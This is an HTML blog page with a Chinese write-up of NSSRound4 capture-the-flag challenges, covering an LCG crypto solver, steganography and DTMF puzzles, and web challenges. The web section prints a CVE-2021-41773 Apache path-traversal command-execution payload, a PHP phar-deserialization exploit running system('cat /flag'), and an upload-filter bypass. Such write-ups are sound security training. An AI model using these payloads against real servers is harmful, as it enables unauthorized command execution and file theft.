@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 当时有事情就没打，现在补票">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【NSSRound4】题目复现">
+<meta property="og:url" content="http://example.com/2022/08/15/%E3%80%90NSSRound4%E3%80%91%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 当时有事情就没打，现在补票">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/08/15/BYAdZ6WjKaogUJf.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/15/mhUApMFP964rnZW.png">
+<meta property="article:published_time" content="2022-08-15T02:13:36.000Z">
+<meta property="article:modified_time" content="2022-08-15T15:22:21.912Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/08/15/BYAdZ6WjKaogUJf.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/08/15/【NSSRound4】题目复现/"/>
+
+
+
+
+
+  <title>【NSSRound4】题目复现 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/15/%E3%80%90NSSRound4%E3%80%91%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【NSSRound4】题目复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-08-15T10:13:36+08:00">
+                2022-08-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>当时有事情就没打，现在补票</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ezcrypto"><a href="#ezcrypto" class="headerlink" title="ezcrypto"></a>ezcrypto</h2><p>Dest0g3 520招新赛那场的原题，直接exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import invert</span><br><span class="line"> </span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">a = 2659869614</span><br><span class="line"> </span><br><span class="line">b = 3138014669</span><br><span class="line"> </span><br><span class="line">m = 2171187379</span><br><span class="line"> </span><br><span class="line">state1 = 32421</span><br><span class="line"> </span><br><span class="line">state2 = 32382</span><br><span class="line"> </span><br><span class="line">c = 628427670713408045832213770914678202267468957347245535228951062583137095137644250375583786099578</span><br><span class="line"> </span><br><span class="line">state1_ = state1 &lt;&lt; 16</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def next(seed):</span><br><span class="line"> </span><br><span class="line">    seed_new = (a * seed + b) % m</span><br><span class="line"> </span><br><span class="line">    return seed_new &gt;&gt; 16,seed_new</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">for i in range(2**16):</span><br><span class="line"> </span><br><span class="line">    t = state1_ + i</span><br><span class="line"> </span><br><span class="line">    if (a * t + b) % m &gt;&gt; 16 == state2:</span><br><span class="line"> </span><br><span class="line">        print(t)</span><br><span class="line"></span><br><span class="line">t_list = [2124752330,2124788500]</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">for i in t_list:</span><br><span class="line"> </span><br><span class="line">    seed = (i - b) * invert(a,m)%m</span><br><span class="line"> </span><br><span class="line">    print(seed)</span><br><span class="line"> </span><br><span class="line">seed_list = [255387149,79695939]</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">c_bytes = long_to_bytes(c)</span><br><span class="line"> </span><br><span class="line">print(len(c_bytes))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">key_list = []</span><br><span class="line"> </span><br><span class="line">seed = 79695939</span><br><span class="line"> </span><br><span class="line">for i in range(47):</span><br><span class="line"> </span><br><span class="line">    key,seed = next(seed)</span><br><span class="line"> </span><br><span class="line">    key_list.append(key%10)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">for i in range(40):</span><br><span class="line"> </span><br><span class="line">    print(chr(key_list[i+2]^c_bytes[i]),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>flag:NSSCTF{378f571491e6559d41ffa02e7a76653e}</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>下载附件是一个docker文件，打开发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from hggg/flag:v0 </span><br><span class="line"></span><br><span class="line">RUN echo FLAG &gt; /flag.txt</span><br></pre></td></tr></table></figure>
+<p>那就直接上dockerhub找hggg/flag，就可以发现flag了。</p>
+<p>flag：NSSCTF{WDLJT_SUPER_MY_MAN}</p>
+<h2 id="Pixel-Signin"><a href="#Pixel-Signin" class="headerlink" title="Pixel_Signin"></a>Pixel_Signin</h2><p>png图片，使用stegsolve看LSB，感觉是有些东西的。然后调整参数，RGB的0-7全部拉满，可以发现一段文本，其中有这么一串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFFPGS&#123;Unehxv_vf_AFF_FHCREZNA_fb_guvf_gnfx_vf_rnfl&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看特征很像是凯撒，测试了下是rot13，解密得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;Haruki_is_NSS_SUPERMAN_so_this_task_is_easy&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Type-Message"><a href="#Type-Message" class="headerlink" title="Type Message"></a>Type Message</h2><p>解压出来四个音频文件，名字结合一下就是DTMF，那就是电话声了，用dtmf2num来处理下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">D.wav：627474238133</span><br><span class="line">T.wav：3118161334374</span><br><span class="line">M.wav：7333221535393</span><br><span class="line">F.wav：322217493</span><br></pre></td></tr></table></figure>
+
+<p>这里是九键键盘密码，比如62对应的就是N，74对应的就是S，以此类推，得到的结果是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF DTMFIS REALLY EASY</span><br></pre></td></tr></table></figure>
+
+<p>flag:NSSCTF{DTMFISREALLYEASY}</p>
+<h2 id="Knight’s-Tour"><a href="#Knight’s-Tour" class="headerlink" title="Knight’s Tour!"></a>Knight’s Tour!</h2><p>下载下来一个压缩包，然后还是损坏的，检查hex，发现文件头是rar的头，离谱，我们修复一下。修复之后用7z解压，得到一张图片：<br><img src="https://s2.loli.net/2022/08/15/BYAdZ6WjKaogUJf.png"></p>
+<p>看不懂，搜搜题目是啥意思，发现是一个骑士巡游问题，就是按照国际象棋中马走日的特征走遍全图。按照下面的顺序走，并且对应颜色，得到结果：<br><img src="https://s2.loli.net/2022/08/15/mhUApMFP964rnZW.png"></p>
+<p>按照红0黄1的规律将每一行转化为二进制，再转化为字符，得到Ch1v@lry，这就是flag了。</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1zweb"><a href="#1zweb" class="headerlink" title="1zweb"></a>1zweb</h2><p>读取文件的过滤没做好，直接读取<code>/flag</code>就拿下了。</p>
+<h2 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h2><p>进入网页什么都没有，看一下服务器是Apache/2.4.49，直接去找漏洞，找到CVE-2021-41773任意文件读取漏洞。</p>
+<p>测试下payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh </span><br><span class="line">POST:echo;id</span><br></pre></td></tr></table></figure>
+
+<p>返回成功，漏洞存在，那么接下来读取根目录，发现有一个flag_is_here，里面存在四层，是一个文件夹迷宫，直接上bp爆破在，最后在<code>/flag_is_here/2/0/7/6/flag</code>中得到flag。</p>
+<h2 id="1zweb-revenge"><a href="#1zweb-revenge" class="headerlink" title="1zweb(revenge)"></a>1zweb(revenge)</h2><p>首先读取index.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class LoveNss&#123;</span><br><span class="line">    public $ljt;</span><br><span class="line">    public $dky;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;ljt=&quot;ljt&quot;;</span><br><span class="line">        $this-&gt;dky=&quot;dky&quot;;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;ljt===&quot;Misc&quot;&amp;&amp;$this-&gt;dky===&quot;Re&quot;)</span><br><span class="line">            eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;ljt=&quot;Re&quot;;</span><br><span class="line">        $this-&gt;dky=&quot;Misc&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_POST[&#x27;file&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;file&#x27;]))&#123;</span><br><span class="line">    if (preg_match(&quot;/flag/&quot;, $file)) &#123;</span><br><span class="line">    	die(&quot;nonono&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo file_get_contents($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>file_get_contents读phar文件时能能触发返序列化漏洞，那这里就是一个phar反序列化，令ljt===”Misc”&amp;&amp;$this-&gt;dky===”Re”，同时绕<code>__wakeup</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  unlink(&#x27;phar.phar&#x27;);</span><br><span class="line">  class LoveNss&#123;</span><br><span class="line">    public $ljt;</span><br><span class="line">    public $dky;</span><br><span class="line">    public $cmd;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $a=new LoveNss();</span><br><span class="line">  $a-&gt;cmd=&quot;system(&#x27;cat /flag&#x27;);&quot;;</span><br><span class="line">  $a-&gt;ljt=&quot;Misc&quot;;</span><br><span class="line">  $a-&gt;dky=&quot;Re&quot;;</span><br><span class="line">  $phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class="line">  $phar-&gt;setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">  $phar-&gt;setMetadata($a);</span><br><span class="line">  $phar-&gt;addFromString(&#x27;1.txt&#x27;,&#x27;dky&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>更改字符串参数数量后重新签名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import sha1</span><br><span class="line">f = open(&#x27;phar.phar&#x27;, &#x27;rb&#x27;).read()</span><br><span class="line">s = f[:-28]</span><br><span class="line">h = f[-8:]</span><br><span class="line">newf = s+sha1(s).digest()+h</span><br><span class="line">open(&#x27;new.phar&#x27;, &#x27;wb&#x27;).write(newf)</span><br></pre></td></tr></table></figure>
+
+<p>读取upload.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;</span><br><span class="line">    echo &quot;上传异常&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</span><br><span class="line">    $temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &amp;&amp; in_array($extension, $allowedExts)))&#123;</span><br><span class="line">        $content=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">        $pos = strpos($content, &quot;__HALT_COMPILER();&quot;);</span><br><span class="line">        if(gettype($pos)===&quot;integer&quot;)&#123;</span><br><span class="line">            echo &quot;ltj一眼就发现了phar&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            if (file_exists(&quot;./upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">                echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $myfile = fopen(&quot;./upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;], &quot;w&quot;);</span><br><span class="line">                fwrite($myfile, $content);</span><br><span class="line">                fclose($myfile);</span><br><span class="line">                echo &quot;上传成功 ./upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;dky不喜欢这个文件 .&quot;.$extension;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不能有phar，必须是图片后缀，zip打包使用phar伪协议绕过即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar://./upload/new.png/phar.phar</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/08/12/%E3%80%90CTFSHOW%E4%B8%83%E5%A4%95%E6%9D%AF%E3%80%91write-up%E5%8F%8A%E5%A4%8D%E7%9B%98/" rel="next" title="【CTFSHOW七夕杯】write up及复盘">
+                <i class="fa fa-chevron-left"></i> 【CTFSHOW七夕杯】write up及复盘
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">86</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number"></span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezcrypto"><span class="nav-number">1.</span> <span class="nav-text">ezcrypto</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number"></span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Signin"><span class="nav-number">1.</span> <span class="nav-text">Signin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pixel-Signin"><span class="nav-number">2.</span> <span class="nav-text">Pixel_Signin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Type-Message"><span class="nav-number">3.</span> <span class="nav-text">Type Message</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Knight%E2%80%99s-Tour"><span class="nav-number">4.</span> <span class="nav-text">Knight’s Tour!</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number"></span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1zweb"><span class="nav-number">1.</span> <span class="nav-text">1zweb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-rce"><span class="nav-number">2.</span> <span class="nav-text">ez_rce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1zweb-revenge"><span class="nav-number">3.</span> <span class="nav-text">1zweb(revenge)</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
